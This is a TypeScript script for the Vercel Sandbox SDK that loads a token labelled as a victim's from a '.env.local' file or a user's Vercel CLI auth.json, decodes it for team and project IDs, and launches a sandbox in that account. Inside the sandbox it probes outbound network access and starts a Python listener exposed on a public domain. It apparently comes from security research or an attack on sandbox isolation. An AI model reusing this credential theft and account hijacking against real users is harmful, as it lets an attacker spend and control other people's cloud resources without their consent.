import { Sandbox } from "@vercel/sandbox";
import { readFileSync, writeFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "egress-probe-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const SCRIPT = `
set +e
echo "=== egress + servidor ==="
dig +short TXT o-o.myaddr.l.google.com @172.31.0.2 2>/dev/null | head -1
timeout 6 curl -s --max-time 5 https://api.ipify.org 2>/dev/null; echo ""
hostname=$(hostname)
echo "hostname=$hostname"
cat > /tmp/srv.py << 'PYEOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 3000))
s.listen(50)
while True:
    c, a = s.accept()
    try:
        data = c.recv(4096).decode("utf-8","replace")
        body = "MARKER=ok host=$hostname peer=%s first=%s" % (a[0], data.split(chr(10))[0] if data else "")
        c.sendall(b"HTTP/1.1 200 OK\\r\\nContent-Length: %d\\r\\n\\r\\n%s" % (len(body.encode()), body.encode()))
    except: pass
    c.close()
PYEOF
nohup python3 /tmp/srv.py > /tmp/srv.log 2>&1 &
sleep 1
ss -tln | grep -E ":3000" | head -1
echo "server-ok"
echo "=== DONE ==="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  const out = await r.output("both");
  console.log(out);
  const dom = sbx.domain(3000);
  console.log("DOMAIN=" + dom);
  writeFileSync("/tmp/egress_dom.txt", dom);
  console.log("KEEP_ALIVE=true");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });